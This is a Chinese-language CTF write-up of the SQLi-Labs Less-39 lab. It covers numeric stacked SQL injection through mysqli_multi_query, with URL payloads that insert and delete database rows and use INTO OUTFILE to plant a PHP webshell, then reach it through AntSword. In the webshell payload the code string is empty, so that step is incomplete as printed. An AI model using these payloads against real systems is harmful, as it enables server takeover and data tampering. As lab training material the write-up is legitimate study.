【SQLi-Labs】Less-39 数字型堆叠注入与 WebShell Writeup

操作者：何芊宏 | 操作日期：2026.10.28 | 分类：CTF | 标签：SQLi-Labs, Web, SQL注入, 堆叠注入, WebShell

1. 题目信息

  • 平台：SQLi-Labs (本地 phpStudy 环境)
  • 分类：Web - SQL注入
  • 题目名称：Less-39 (GET - Stacked Query Injection - Intiger based)
  • 提示：数字型注入，后端使用 mysqli_multi_query() 支持堆叠执行。

2. 核心原理与前置分析

本关卡与 Less-38 同样支持堆叠注入。源码中 SQL 语句为 id=$id，属于纯数字型注入，无需使用单引号进行闭合。因此，堆叠注入的分号 ; 可以直接拼接在数字之后。

由于页面仅处理并回显第一条 SELECT 查询结果，后续的堆叠语句属于“盲执行”状态，需通过外部副作用（如写入新用户、写入文件）来验证执行结果。本关利用 INTO OUTFILE 语句将恶意 PHP 代码写入服务器物理目录，配合中国蚁剑获取控制权。

3. 操作步骤与解析

第一步：验证堆叠与副作用（盲执行测试）

输入 URL：?id=1; insert into users(id,username,password) values(999,'pwn39','pwn39')-- -

验证：访问 ?id=999，页面显示 Your Username is : pwn39，证明插入语句已被成功执行。

清理测试数据：?id=1; delete from users where id=999-- -

第二步：写入 WebShell

输入 URL：?id=1; select '' into outfile 'D:/phpstudy_pro/WWW/sqli-labs-master/Less-39/shell.php'-- -

解释：直接拼接分号与 INTO OUTFILE，将一句话木马写入目标目录。

第三步：中国蚁剑连接

AntSword 的具体连接配置操作步骤与 Less-38 完全一致，此处不再重复赘述。仅在添加数据时，修改以下必要参数：

  • URL 地址：http://localhost/sqli-labs-master/Less-39/shell.php
  • 连接密码：cmd

连接成功后，即可在文件管理界面浏览、修改目标服务器文件。

4. 复盘与注意事项

  • 盲执行验证：堆叠注入的 INSERT 或 OUTFILE 不会在当前页面回显，必须通过二次访问新数据或去本地物理路径查看文件是否生成，来确认命令是否真正执行。
  • 数字型思维定势：由于刚打完 L38（单引号字符型），在 L39 极易顺手输入单引号去闭合，导致语法报错。必须严格根据“未过滤且提示 numeric value”判断为纯数字型。
  • Windows 路径规范：在 INTO OUTFILE 写入文件时，Windows 下的路径必须使用正斜杠 / 或双反斜杠 \\，直接写单反斜杠 \ 会被当作转义字符导致写入失败。

5. 知识点总结

  • 数字型堆叠注入：无需闭合引号，使用分号直接截断并执行新语句。
  • INTO OUTFILE：利用数据库的高权限，将查询结果（恶意代码）写入系统文件，实现从 SQL 注入到服务器控制的提权。
